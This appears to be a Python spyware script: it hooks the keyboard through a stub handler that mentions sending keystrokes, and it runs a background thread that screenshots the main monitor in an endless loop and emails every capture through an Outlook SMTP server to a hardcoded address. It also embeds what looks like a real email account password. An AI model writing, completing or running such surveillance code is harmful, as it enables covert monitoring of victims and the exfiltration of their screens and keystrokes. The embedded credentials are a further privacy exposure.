import keyboard
import cv2
import numpy as np
from mss import mss
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading

# Set up email configuration
email_address = 'ahmedmrh20@hotmail.com'
email_password = '123bomteam123'

# Function to send email with attachment
def send_email(filename):
    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = email_address
    msg['Subject'] = 'Screen Recording'

    body = 'Screen recording attached.'
    msg.attach(MIMEText(body, 'plain'))

    attachment = open(filename, 'rb')

    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(part)

    server = smtplib.SMTP('smtp-mail.outlook.com', 587)
    server.starttls()
    server.login(email_address, email_password)
    text = msg.as_string()
    server.sendmail(email_address, email_address, text)
    server.quit()

# Function to send keystrokes
def send_keystrokes(event):
    pass  # You might want to handle this differently if you still want to send keystrokes

# Start monitoring keystrokes
keyboard.hook(send_keystrokes)

# Function to stream screen and send recording by email
def stream_screen_and_send_email():
    with mss() as sct:
        while True:
            frame = np.array(sct.grab(sct.monitors[1]))
            filename = 'screen_recording.jpg'
            cv2.imwrite(filename, frame)
            send_email(filename)

# Start streaming screen and sending recording by email
screen_thread = threading.Thread(target=stream_screen_and_send_email)
screen_thread.start()
